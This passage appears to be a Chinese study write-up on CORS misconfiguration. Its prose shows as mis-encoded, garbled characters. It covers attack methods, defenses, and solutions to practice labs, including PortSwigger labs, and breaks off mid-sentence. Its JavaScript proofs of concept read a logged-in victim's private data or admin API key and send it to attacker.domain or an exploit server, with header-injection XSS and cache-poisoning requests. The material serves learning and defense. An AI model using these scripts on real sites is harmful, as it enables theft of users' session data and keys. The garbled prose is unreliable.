nullå’ŒAccess-Control-Allow-Credentials:trueçš„ç½‘ç«™ç­‰åŒäºæ²¡æœ‰æµè§ˆå™¨SOPçš„ä¿æŠ¤ï¼Œéƒ½å¯ä»¥è¢«å…¶ä»–ä»»æ„åŸŸä»¥è¿™ç§æ–¹å¼è¯»å–å†…å®¹ã€‚ 0x09 åˆ©ç”¨CORSæ¼æ´(åå®é™…ç¯å¢ƒ) æµç¨‹: å‡è®¾ç”¨æˆ·ç™»é™†ä¸€ä¸ªå«æœ‰CORSé…ç½®ç½‘ç«™vuln.comï¼ŒåŒæ—¶åˆè®¿é—®äº†æ”»å‡»è€…æä¾›çš„ä¸€ä¸ªé“¾æ¥evil.comã€‚ evil.comçš„ç½‘ç«™å‘vuln.comè¿™ä¸ªç½‘ç«™å‘èµ·è¯·æ±‚è·å–æ•æ„Ÿæ•°æ®ï¼Œæµè§ˆå™¨èƒ½å¦æ¥æ”¶ä¿¡æ¯å–å†³äºvuln.comçš„é…ç½®ã€‚ å¦‚æœvuln.comé…ç½®äº†Access-Control-Allow-Originå¤´ä¸”ä¸ºå…è®¸æ¥æ”¶ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå› ä¸ºåŒæºç­–ç•¥è€Œä¸æ¥æ”¶ã€‚ æ–¹å¼ä¸€ï¼šå­˜åœ¨ç”¨æˆ·å‡­è¯ è¯¦ç»†è¿‡ç¨‹ åˆ›å»ºä¸€ä¸ªJavaScriptè„šæœ¬å»å‘é€CORSè¯·æ±‚ï¼Œpocå…³é”®ä»£ç å¦‚ä¸‹ï¼š var req = new XMLHttpRequest(); req.onload = reqListener(); req.open(â€œgetâ€,â€https://vulnerable.domain/api/private-dataâ€,true); req.withCredentials = true; req.send(); function reqListener() { location=â€//attacker.domain/log?response=â€+this.responseText; }; 2. å½“å¸¦æœ‰ç›®æ ‡ç³»ç»Ÿçš„ç”¨æˆ·è®¿é—®çš„ä¸»æœºè®¿é—®ä¸Šè¿°ä»£ç çš„é¡µé¢æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šå‘é€ä¸‹é¢çš„è¯·æ±‚åˆ°å­˜åœ¨CORSé…ç½®çš„æœåŠ¡å™¨ã€‚ ```http GET /api/private-data HTTP/1.1 Host: vulnerable.domain Origin: https://attacker.domain/ Cookie: JSESSIONID=&lt;redacted&gt; ``` 3. å“åº”åŒ… ```http HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Access-Control-Allow-Origin: https://attacker.domain Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials Vary: Origin Expires: Thu, 01 Jan 1970 12:00:00 GMT Last-Modified: Wed, 02 May 2018 09:07:07 GMT Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0 Pragma: no-cache Content-Type: application/json;charset=ISO-8859-1 Date: Wed, 02 May 2018 09:07:07 GMT Connection: close Content-Length: 149 {\"id\":1234567,\"name\":\"Name\",\"surname\":\"Surname\",\"email\":\"email@target.local\",\"account\":\"ACT1234567\",\"balance\":\"123456,7\",\"token\":\"to p-secret-string\"} ``` 3. å› ä¸ºæœåŠ¡å™¨å‘é€äº†å³è¾¹çš„â€œ Access-Control-Allow- *â€ç»™å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥ï¼Œæ”»å‡»çš„æµè§ˆå™¨å…è®¸åŒ…å«æ¶æ„çš„JavaScriptä»£ç çš„é¡µé¢è®¿é—®ç”¨æˆ·çš„éšç§æ•°æ®ã€‚ #### æ–¹å¼äºŒï¼šä¸å­˜åœ¨ç”¨æˆ·å‡­è¯ ![image-20230510212310583](CORSè·¨åŸŸæ¼æ´/image-20230510212310583.png) **è¯¦ç»†è¿‡ç¨‹** 1. æ”»å‡»æ–¹å¼1ï¼šç»•è¿‡åŸºäºIPçš„è®¤è¯ å¦‚æœç›®æ ‡åº”ç”¨ç¨‹åºä¸å—å®³è€…çš„ç½‘ç»œå¯è¾¾æ€§ï¼Œå¹¶ä¸”ç›®æ ‡åº”ç”¨ç¨‹åºä½¿ç”¨IPåœ°å€ä½œä¸ºèº«ä»½éªŒè¯çš„æ–¹å¼ï¼Œåˆ™é»‘å®¢ä¼šåˆ©ç”¨å—å®³è€…çš„æµè§ˆå™¨ä½œä¸ºä»£ç†å»è®¿é—®é‚£äº›ç›®æ ‡åº”ç”¨ç¨‹åºå¹¶ä¸”å¯ä»¥ç»•è¿‡é‚£äº›åŸºäºIPçš„èº«ä»½éªŒè¯ã€‚ 2. æ”»å‡»æ–¹å¼2ï¼šå®¢æˆ·ç«¯ç¼“å­˜ä¸­æ¯’ ä¾‹å¦‚ï¼Œæ•°æ®æŠ¥æ–‡å¤´éƒ¨ä¸­åŒ…å«`X-User`æ ‡å¤´ï¼Œå…¶å€¼æœªè¿›è¡Œä»»ä½•è¾“å…¥éªŒè¯ï¼Œè¾“å‡ºç¼–ç ã€‚ è¯·æ±‚åŒ… ```http GET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: &lt;svg/onload=alert(1)&gt; ``` å“åº”åŒ… `Access-Control-Allow-Origin`å·²è¢«è®¾ç½®ï¼Œ`Access-Control-Allow-Credentials: true`ä¸`Vary: Origin`å¤´é€‚åˆè®¾ç½® ```http HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ â€¦ Content-Type: text/html â€¦ Invalid user: &lt;svg/onload=alert(1)&gt; ``` æ„é€ å­˜åœ¨æ¶æ„çš„XSSæœ‰æ•ˆè´Ÿè½½é¡µé¢ï¼Œè¯±ä½¿å—å®³è€…è§¦å‘ã€‚ ```JavaScript var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://www.target.local/login',true); req.setRequestHeader('X-User', '&lt;svg/onload=alert(1)&gt;'); req.send(); function reqListener() { location='http://www.target.local/login'; } ``` 1. æ”»å‡»æ–¹å¼3ï¼šæœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­æ¯’ åˆ©ç”¨CORSçš„é”™è¯¯é…ç½®æ³¨å…¥ä»»æ„HTTPå¤´éƒ¨ï¼Œå°†å…¶ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ç¼“å­˜ä¸­ï¼Œå¯ç”¨äºæ„é€ å­˜å‚¨ç±»å‹XSSã€‚ åˆ©ç”¨æ¡ä»¶ï¼šå­˜åœ¨æœåŠ¡å™¨ç«¯ç¼“å­˜ï¼Œèƒ½å¤Ÿåå°„`Origin`å¤´éƒ¨ï¼Œä¸ä¼šæ£€æŸ¥`Origin`å¤´éƒ¨ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚`\\r` åˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»IE / Edgeç”¨æˆ·ï¼ˆIE / Edgeä½¿ç”¨`\\r`ä½œä¸ºçš„HTTPæ ‡é¢˜æ®µçš„ç»ˆç»“ç¬¦ï¼‰ è¯·æ±‚åŒ… ```http GET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7 ``` å›è½¦ï¼ˆCRï¼‰ï¼šASCIIç ï¼š'\\r' ï¼Œåå…­è¿›åˆ¶ï¼š0x0d å“åº”åŒ… ```http HTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7 ``` å¦‚æœæ”»å‡»è€…èƒ½æå‰å‘é€ç•¸å½¢çš„`Origin`æ¶ˆæ¯å¤´ï¼Œåˆ™åˆ©ç”¨ä»£ç†æˆ–å‘½ä»¤è¡Œçš„æ–¹å¼å‘é€ï¼Œåˆ™æœåŠ¡å™¨å°±ä¼šç¼“å­˜è¿™æ ·çš„è¿”å›æŠ¥æ–‡å¹¶ä½œç”¨äºå…¶ä»–ç”¨æˆ·ã€‚ä¸Šä¾‹ä¸­ï¼Œæ”»å‡»è€…å°†é¡µé¢çš„ç¼–ç è®¾ç½®ä¸º`UTF-7`ï¼Œå¯å¼•å‘XSSä¸­æ–­ã€‚ #### ç±»å‹2 1.æè¿° åœ¨æ­£å¸¸çš„ç½‘é¡µè¢«åµŒå…¥äº†åˆ°æ”»å‡»è€…æ§åˆ¶é¡µé¢çš„è·¨åŸŸè¯·æ±‚ï¼Œä»è€ŒåŠ«æŒç”¨æˆ·çš„ä¼šè¯ã€‚ 2.æŒ–æ˜ åŒä¸Š 3.åˆ©ç”¨ 1,äº¤äº’å¼xssã€‚é€šè¿‡CORSï¼Œç»•è¿‡ä¸€äº›åä¼šè¯åŠ«æŒçš„æ–¹æ³•ï¼Œå¦‚HTTP-Onlyé™åˆ¶çš„cookieï¼Œç»‘å®šIPåœ°å€çš„ä¼šè¯IDç­‰ï¼ŒåŠ«æŒç”¨æˆ·ä¼šè¯ã€‚ 2,ç¨‹åºçŒ¿åœ¨å†™ajaxè¯·æ±‚çš„æ—¶å€™ï¼Œå¯¹ç›®æ ‡åŸŸé™åˆ¶ä¸ä¸¥ã€‚æœ‰ç‚¹ç±»ä¼¼äºurlè·³è½¬ã€‚facebookå‡ºç°è¿‡è¿™æ ·ä¸€ä¸ªæ¡ˆä¾‹ã€‚javascripté€šè¿‡urlé‡Œçš„å‚æ•°è¿›è¡Œajaxè¯·æ±‚ã€‚ ## 0x10 é¢„é˜²CORSæ¼æ´ CORSæ¼æ´ä¸»è¦æ˜¯ç”±äºé…ç½®é”™è¯¯è€Œå¼•èµ·çš„ã€‚æ‰€ä»¥ï¼Œé¢„é˜²æ¼æ´å˜æˆäº†ä¸€ä¸ªé…ç½®é—®é¢˜ã€‚ä¸‹é¢ä»‹ç»äº†ä¸€äº›é’ˆå¯¹CORSæ”»å‡»çš„æœ‰æ•ˆé˜²å¾¡æªæ–½ã€‚ 1. æ­£ç¡®é…ç½®è·¨åŸŸè¯·æ±‚ å¦‚æœWebèµ„æºåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œåˆ™åº”åœ¨Access-Control-Allow-Originæ ‡å¤´ä¸­æ­£ç¡®æŒ‡å®šæ¥æºã€‚ 2. åªå…è®¸ä¿¡ä»»çš„ç½‘ç«™ çœ‹èµ·æ¥ä¼¼ä¹å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯Access-Control-Allow-Originä¸­æŒ‡å®šçš„æ¥æºåªèƒ½æ˜¯å—ä¿¡ä»»çš„ç«™ç‚¹ã€‚ç‰¹åˆ«æ˜¯ï¼Œä½¿ç”¨é€šé…ç¬¦æ¥è¡¨ç¤ºå…è®¸çš„è·¨åŸŸè¯·æ±‚çš„æ¥æºè€Œä¸è¿›è¡ŒéªŒè¯å¾ˆå®¹æ˜“è¢«åˆ©ç”¨ï¼Œåº”è¯¥é¿å…ã€‚ 3. é¿å…å°†nullåˆ—å…¥ç™½åå• é¿å…ä½¿ç”¨æ ‡é¢˜Access-Control-Allow-Origin: nullã€‚æ¥è‡ªå†…éƒ¨æ–‡æ¡£å’Œæ²™ç›’è¯·æ±‚çš„è·¨åŸŸèµ„æºè°ƒç”¨å¯ä»¥æŒ‡å®šnullæ¥æºã€‚åº”é’ˆå¯¹ç§æœ‰å’Œå…¬å…±æœåŠ¡å™¨çš„å¯ä¿¡æ¥æºæ­£ç¡®å®šä¹‰CORSå¤´ã€‚ 4. é¿å…åœ¨å†…éƒ¨ç½‘ç»œä¸­ä½¿ç”¨é€šé…ç¬¦ é¿å…åœ¨å†…éƒ¨ç½‘ç»œä¸­ä½¿ç”¨é€šé…ç¬¦ã€‚å½“å†…éƒ¨æµè§ˆå™¨å¯ä»¥è®¿é—®ä¸å—ä¿¡ä»»çš„å¤–éƒ¨åŸŸæ—¶ï¼Œä»…é ä¿¡ä»»ç½‘ç»œé…ç½®æ¥ä¿æŠ¤å†…éƒ¨èµ„æºæ˜¯ä¸å¤Ÿçš„ã€‚ 5. CORSä¸èƒ½æ›¿ä»£æœåŠ¡å™¨ç«¯å®‰å…¨ç­–ç•¥ CORSå®šä¹‰äº†æµè§ˆå™¨çš„è¡Œä¸ºï¼Œç»ä¸èƒ½æ›¿ä»£æœåŠ¡å™¨ç«¯å¯¹æ•æ„Ÿæ•°æ®çš„ä¿æŠ¤-æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»ä»»ä½•å¯ä¿¡æ¥æºä¼ªé€ è¯·æ±‚ã€‚å› æ­¤ï¼Œé™¤äº†æ­£ç¡®é…ç½®çš„CORSä¹‹å¤–ï¼ŒWebæœåŠ¡å™¨è¿˜åº”ç»§ç»­å¯¹æ•æ„Ÿæ•°æ®åº”ç”¨ä¿æŠ¤ï¼Œä¾‹å¦‚èº«ä»½éªŒè¯å’Œä¼šè¯ç®¡ç†ã€‚ ## 0x11 CORSé¶åœºç»ƒä¹  è¯¥é¶åœºå†…ç½®äº†3ä¸ª CORS çš„æ¼æ´åœºæ™¯ - åœºæ™¯ä¸€ï¼šä¿¡ä»»ä»»æ„ Origin æº - åœºæ™¯äºŒï¼šæ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹ Origin æº - åœºæ™¯ä¸‰ï¼šä¿¡ä»»ä»»æ„ null æº![image-20230510214108156](CORSè·¨åŸŸæ¼æ´/image-20230510214108156.png) æ¼æ´æ£€æµ‹: ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¿®æ”¹è¯·æ±‚åŒ… Header ä¸­çš„ Origin å­—æ®µä¸ºä»»æ„åŸŸåæˆ–è€…ä¸º null çš„æ–¹å¼å»æ£€æµ‹è¯¥æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚ #### åœºæ™¯ä¸€ï¼šä¿¡ä»»ä»»æ„ Origin æº åº”ç”¨ç¨‹åºæ¥å—æ¥è‡ªä»»ä½• Origin çš„ CORS è¯·æ±‚ã€‚è¯¥ä»£ç å°† Origin å€¼æ”¾åœ¨ HTTP å“åº”å¤´ Access-Control-Allow-Origin ä¸­ã€‚ç°åœ¨ï¼Œæ­¤é…ç½®å°†å…è®¸æ¥è‡ªä»»ä½• Origin çš„ä»»ä½•è„šæœ¬å‘åº”ç”¨ç¨‹åºå‘å‡º CORS è¯·æ±‚ã€‚Web æµè§ˆå™¨å°†æ‰§è¡Œæ ‡å‡†çš„ CORS è¯·æ±‚æ£€æŸ¥ï¼Œæ¥è‡ªæ¶æ„åŸŸçš„è„šæœ¬å°†èƒ½å¤Ÿçªƒå–æ•°æ®ã€‚ åº”ç”¨ç¨‹åºæ¥å— Origin æ ‡å¤´ä¸­æŒ‡å®šçš„ä»»ä½•å€¼ã€‚ ![image-20230510215219591](CORSè·¨åŸŸæ¼æ´/image-20230510215219591.png) å¯ä»¥çœ‹åˆ°ç®­å¤´å¤„çš„åŸŸå,æ˜¯ä»»æ„çš„,è€Œè¯¥ç½‘ç«™éƒ½å…è®¸åŸŸåå‘å‡ºè¯·æ±‚å¹¶å›æ˜¾(originå¤„æ˜¯æˆ‘è‡ªå·±æ·»åŠ çš„) #### åœºæ™¯äºŒï¼šæ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹ Origin æº åº”ç”¨ç¨‹åºå·²å®æ–½ CORS ç­–ç•¥å¹¶å¯¹åˆ—å…¥ç™½åå•çš„åŸŸ/å­åŸŸæ‰§è¡Œâ€œæ­£åˆ™è¡¨è¾¾å¼â€æ£€æŸ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåº”ç”¨ç¨‹åºåœ¨ä»£ç ä¸­å…·æœ‰å¼±æ­£åˆ™è¡¨è¾¾å¼å®ç°ï¼Œå®ƒåªæ£€æŸ¥ HTTP è¯·æ±‚ Origin æ ‡å¤´ä¸­ä»»ä½•ä½ç½®çš„åŸŸå b0x.com çš„å­˜åœ¨ã€‚å¦‚æœ HTTP æ ‡å¤´ Origin çš„å€¼ä¸º inb0x.com æˆ– b0x.comlab.comï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¼šå°†å…¶æ ‡è®°ä¸ºé€šè¿‡ã€‚è¿™ç§é”™è¯¯é…ç½®å°†å¯¼è‡´è·¨æºå…±äº«æ•°æ®ã€‚ **åº”ç”¨ç¨‹åºä¿¡ä»»åˆ—å…¥ç™½åå•çš„ Originã€‚** ![image-20230510215728867](CORSè·¨åŸŸæ¼æ´/image-20230510215728867.png) **åº”ç”¨ç¨‹åºä¸å…è®¸ä»»ä½•ä»»æ„æ¥æº, å¯ä»¥çœ‹åˆ°ä¸‹å›¾å³ä¾§æ²¡æœ‰CORSå¤´** ![image-20230510215801410](CORSè·¨åŸŸæ¼æ´/image-20230510215801410.png) åº”ç”¨ç¨‹åºå¼±æ­£åˆ™è¡¨è¾¾å¼å…è®¸åœ¨åŸŸåå¼€å¤´å…·æœ‰ç™½åå•åŸŸå­—ç¬¦ä¸²çš„ Originã€‚ ![image-20230510215958783](CORSè·¨åŸŸæ¼æ´/image-20230510215958783.png) åº”ç”¨ç¨‹åºå¼±æ­£åˆ™è¡¨è¾¾å¼å…è®¸åœ¨åŸŸåæœ«å°¾å…·æœ‰ç™½åå•åŸŸå­—ç¬¦ä¸²çš„ Originã€‚ ![image-20230510220029500](CORSè·¨åŸŸæ¼æ´/image-20230510220029500.png) #### åœºæ™¯ä¸‰ï¼šä¿¡ä»»nullæº åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåº”ç”¨ç¨‹åº HTTP å“åº”æ ‡å¤´ Access-Control-Allow-Origin å§‹ç»ˆè®¾ç½®ä¸º nullã€‚å½“ç”¨æˆ·æŒ‡å®š null ä»¥å¤–çš„ä»»ä½•å€¼æ—¶ï¼Œåº”ç”¨ç¨‹åºä¸ä¼šå¤„ç†å®ƒå¹¶åœ¨ HTTP å“åº”ä¸­ç»§ç»­åæ˜  null ã€‚å…è®¸æ”»å‡»è€…æ‰§è¡Œæ¼æ´åˆ©ç”¨çš„æŠ€å·§å¾ˆå°‘ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ CORS è¯·æ±‚è¿‡æ»¤å—å®³è€…çš„æ•°æ®ã€‚ **åº”ç”¨ç¨‹åºæ¥å— Origin æ ‡å¤´ä¸­æŒ‡å®šçš„ null å€¼ã€‚** ![image-20230510220243338](CORSè·¨åŸŸæ¼æ´/image-20230510220243338.png) #### æ³¨æ„äº‹é¡¹ å¦‚æœå“åº”åŒ… Header ä¸­ä¸ºä»¥ä¸‹æƒ…å†µ ï¼Œåˆ™ä¸å­˜åœ¨æ¼æ´ã€‚ ``` Access-Control-Allow-Origin: * Access-Control-Allow-Credentials:true ``` ![image-20230510220310783](CORSè·¨åŸŸæ¼æ´/image-20230510220310783.png) åŸå› æ˜¯å› ä¸ºæµè§ˆå™¨ä¼šå¯¹æ­¤ç±»æƒ…å†µçš„è¯·æ±‚è¿›è¡Œè‡ªåŠ¨æ‹¦æˆªï¼Œä¸å…·å¤‡æ¼æ´åˆ©ç”¨æ¡ä»¶ã€‚ åœ¨ CORS-vulnerable-Lab é¶åœºçš„ POCs ç›®å½•ä¸‹ï¼Œæœ‰ CORS æ¼æ´åˆ©ç”¨çš„è„šæœ¬ ä»¥ `arbitrary_origin_exploit.html` ä¸ºä¾‹ï¼Œç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€è¯¥è„šæœ¬æ–‡ä»¶ï¼Œæ‰¾åˆ°å¦‚ä¸‹ä»£ç å¹¶æ ¹æ®å®é™…åº”ç”¨åœºæ™¯è¿›è¡Œä¿®æ”¹ ````js &lt;script&gt; //å‘ç›®æ ‡åº”ç”¨ç¨‹åºç½‘é¡µå‘å‡º CORS è¯·æ±‚ä»¥è·å– HTTP å“åº”çš„å‡½æ•° function exploit() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 &amp;&amp; this.status == 200) { var all = this.responseText; document.getElementById(\"load\").innerHTML= all; // åˆ†å‰²æ‰“å°è¢«ç›—å–çš„ HTTP å“åº” } }; xhttp.open(\"GET\", \"http://192.168.126.6/CORS/arbitrary_origin.php\", true); //å°† URL æ›´æ”¹ä¸ºé”™è¯¯é…ç½® CORS ç­–ç•¥çš„ URL xhttp.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,\\/;q=0.8\"); xhttp.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhttp.withCredentials = true; xhttp.send(); } &lt;/script&gt; å°†åˆ©ç”¨è„šæœ¬æ”¾ç½®åœ¨æ­å»ºçš„æ¶æ„ç½‘ç«™ä¸‹ï¼Œå½“å—å®³è€…åœ¨åŒä¸€æµè§ˆå™¨ç™»å½•ç›®æ ‡ç½‘ç«™ï¼Œå¹¶æ‰“å¼€è¯¥æ¶æ„é“¾æ¥ï¼Œå³å¯ç›—å–ç›®æ ‡ç½‘ç«™çš„ HTTP å“åº”å†…å®¹ã€‚ è¿™é‡Œæˆ‘å¤ç°ä¸å‡ºæ¥â€¦ 0x12 bpå®˜ç½‘çš„é¶åœºç»ƒä¹  å®éªŒä¸€: å…·æœ‰åŸºæœ¬åŸç‚¹åå°„çš„ CORS æ¼æ´ ä¿¡æ¯: è¯¥ç½‘ç«™å…·æœ‰ä¸å®‰å…¨çš„CORSé…ç½®ï¼Œå› ä¸ºå®ƒä¿¡ä»»æ‰€æœ‰æ¥æºã€‚ è¦è§£å†³è¯¥å®éªŒå®¤é—®é¢˜ï¼Œè¯·ç¼–å†™ä¸€äº›ä½¿ç”¨ CORS æ£€ç´¢ç®¡ç†å‘˜ API å¯†é’¥å¹¶å°†ä»£ç ä¸Šä¼ åˆ°æ¼æ´åˆ©ç”¨æœåŠ¡å™¨çš„ JavaScriptã€‚å½“æ‚¨æˆåŠŸæäº¤ç®¡ç†å‘˜çš„ API å¯†é’¥æ—¶ï¼Œè¯¥å®éªŒå°±è§£å†³äº†ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°æ‚¨è‡ªå·±çš„å¸æˆ·ï¼šwiener:peter é¦–å…ˆå¼€å¯bpä»£ç†,åŒæ—¶å…³é—­æ‹¦æˆª,è®°å½•ä½ æµè§ˆç½‘é¡µçš„è¯·æ±‚ ç™»é™†è´¦å·ï¼ŒæŸ¥çœ‹å†å²è®°å½•å¹¶è§‚å¯Ÿåˆ°å¯†é’¥æ˜¯é€šè¿‡AJAXè¯·æ±‚/accountDetailsæ£€ç´¢çš„ï¼Œå¹¶ä¸”å“åº”åŒ…å«Access-Control-Allow-Credentialsæ ‡å¤´ï¼Œè¡¨æ˜å®ƒå¯èƒ½æ”¯æŒCORS æ¥ä¸‹æ¥æˆ‘ä»¬å°†å…¶å‘é€åˆ°é‡å‘å™¨,éªŒè¯æ˜¯å¦æœ‰CORSæ¼æ´ å¦‚ä¸Šå›¾æˆ‘ä»¬åœ¨è¯·æ±‚åŒºæ·»åŠ originå¤´,å¹¶å†™å…¥éšæ„çš„ä¸€ä¸ªåŸŸå,å“åº”åå‘ç°å³ä¾§çš„CORSå¤´å‡ºç°æˆ‘ä»¬è¾“å…¥çš„åŸŸå(ä¸è®ºæˆ‘ä»¬çš„åŸŸåæ˜¯ä»€ä¹ˆ),è¿™è¯´æ˜çš„ç¡®å­˜åœ¨CORSæ¼æ´, å³å…è®¸ä»»æ„æºçš„è®¿é—® æ¥ä¸‹æ¥æˆ‘ä»¬è¦ç¼–å†™jsè„šæœ¬,æ„åœ¨å‘æœåŠ¡å™¨å‘é€è·å–ç®¡ç†å‘˜è¯¦ç»†ä¿¡æ¯çš„è¯·æ±‚(è¿™é‡Œæ˜¯cookie),å¹¶å°†è¯·æ±‚å¾—åˆ°çš„æ•°æ®å­˜æ”¾åœ¨æˆ‘ä»¬çš„æ—¥å¿—ä¸­ https://0ac200c803b3121486c4a98700c50006: æ­¤å¤„æ¢æˆä½ å®éªŒå®¤çš„urlå³å¯ &lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ac200c803b3121486c4a98700c50006.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; &lt;/script&gt; æ¥ç€å°†è¯¥è„šæœ¬æ·»åŠ åˆ°æ¼æ´æœåŠ¡å™¨ä¸­(å‘é€ç»™å—å®³è€…),æŸ¥çœ‹ä½ çš„æ—¥å¿—,å¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°æˆåŠŸå¾—åˆ°ç®¡ç†å‘˜çš„apikey å¦‚ä¸Šå›¾,ä»å·¦åˆ°å³ä¾æ¬¡ç‚¹å‡»å³å¯ å®éªŒå®¤äºŒï¼šå—ä¿¡ä»»ç©ºæºçš„CORSæ¼æ´ æç¤º: è¿™ä¸ªç½‘ç«™æœ‰ä¸€ä¸ªä¸å®‰å…¨çš„CORSé…ç½®ï¼Œå› ä¸ºå®ƒä¿¡ä»»â€œnullâ€æ¥æºã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªå®éªŒï¼Œç¼–å†™ä¸€äº›JavaScriptï¼Œä½¿ç”¨CORSæ£€ç´¢ç®¡ç†å‘˜çš„APIå¯†é’¥å¹¶å°†ä»£ç ä¸Šä¼ åˆ°æ¼æ´åˆ©ç”¨æœåŠ¡å™¨ã€‚å½“æ‚¨æˆåŠŸæäº¤ç®¡ç†å‘˜çš„APIå¯†é’¥æ—¶ï¼Œè¯¥å®éªŒå°±è§£å†³äº†. æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®ç™»å½•åˆ°è‡ªå·±çš„å¸æˆ·ï¼šwiener:peter åŒä¸Šé¢˜ ç™»é™†è´¦å·ï¼Œå•å‡»\"æˆ‘çš„å¸æˆ·\"ï¼ŒæŸ¥çœ‹å†å²è®°å½•å¹¶è§‚å¯Ÿåˆ°å¯†é’¥æ˜¯é€šè¿‡AJAXè¯·æ±‚/accountDetailsæ£€ç´¢çš„ï¼Œå¹¶ä¸”å“åº”åŒ…å«Access-Control-Allow-Credentialsæ ‡å¤´ï¼Œè¡¨æ˜å®ƒå¯èƒ½æ”¯æŒCORS ç»è¿‡å®éªŒå‘ç°,è¿™æ¬¡ä¸èƒ½å…è®¸ä»»æ„æºçš„è®¿é—®äº†,é‚£æˆ‘ä»¬ç»™originèµ‹å€¼ä¸ºnullçœ‹çœ‹å“åº”,å‘ç°æˆåŠŸå“åº” æ¥ç€ç”¨iframeæ„é€ nullæºçš„è¯·æ±‚æ¥ç»•è¿‡ åœ¨æµè§ˆå™¨ä¸­ï¼Œè½¬åˆ°æ¼æ´åˆ©ç”¨æœåŠ¡å™¨å¹¶è¾“å…¥ä»¥ä¸‹HTMLï¼ˆå°†YOUR-LAB-IDæ›¿æ¢ä¸ºå®éªŒå®¤URLçš„URLï¼Œå°†YOUR-EXPLOIT-SERVER-IDæ›¿æ¢ä¸ºæ¼æ´åˆ©ç”¨æœåŠ¡å™¨IDï¼‰ &lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; &lt;/script&gt;\"&gt;&lt;/iframe&gt; æˆ‘çš„æ˜¯ï¼š &lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"&lt;script&gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a3100d803693dd6813ff78900520003.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a8900c2034a3d9a8119f65d01ab00f8.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; &lt;/script&gt;\"&gt;&lt;/iframe&gt; æ³¨æ„iframeæ²™ç®±çš„ä½¿ç”¨ï¼Œå› ä¸ºè¿™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æºè¯·æ±‚ã€‚ åŸå› å¦‚ä¸‹ï¼šGPTå›ç­” è¿™é‡Œiframeæ²™ç®±ä¸ºä½•ä¼šäº§ç”Ÿä¸€ä¸ªç©ºçš„æºè¯·æ±‚ï¼Ÿ //ChatGPT åœ¨ç»™å®šçš„ä»£ç ä¸­ï¼Œä½¿ç”¨äº†ä¸€ä¸ªå…·æœ‰æ²™ç®±å±æ€§çš„ &lt;iframe&gt; å…ƒç´ ï¼Œå®ƒçš„ sandbox å±æ€§è¢«è®¾ç½®ä¸º \"allow-scripts allow-top-navigation allow-forms\"ã€‚è¿™äº›å±æ€§æŒ‡å®šäº†ä¸€ç»„æ²™ç®±è§„åˆ™ï¼Œç”¨äºé™åˆ¶åµŒå…¥çš„æ–‡æ¡£çš„è¡Œä¸ºã€‚ å…¶ä¸­ï¼Œallow-scripts å±æ€§å…è®¸åµŒå…¥çš„æ–‡æ¡£æ‰§è¡Œè„šæœ¬ï¼Œallow-top-navigation å±æ€§å…è®¸åµŒå…¥çš„æ–‡æ¡£å¯¼èˆªåˆ°é¡¶çº§çª—å£ï¼Œallow-forms å±æ€§å…è®¸åµŒå…¥çš„æ–‡æ¡£æäº¤è¡¨å•ã€‚ **å½“ä½¿ç”¨å…·æœ‰æ²™ç®±å±æ€§çš„ &lt;iframe&gt; å…ƒç´ æ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š src å±æ€§ï¼Œåˆ™ä¼šæ‰§è¡Œ srcdoc å±æ€§çš„å†…å®¹ä½œä¸ºå†…è”æ–‡æ¡£ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå†…è”æ–‡æ¡£çš„æºè¢«è§†ä¸ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚** ç”±äºæºè¢«è§†ä¸ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œå› 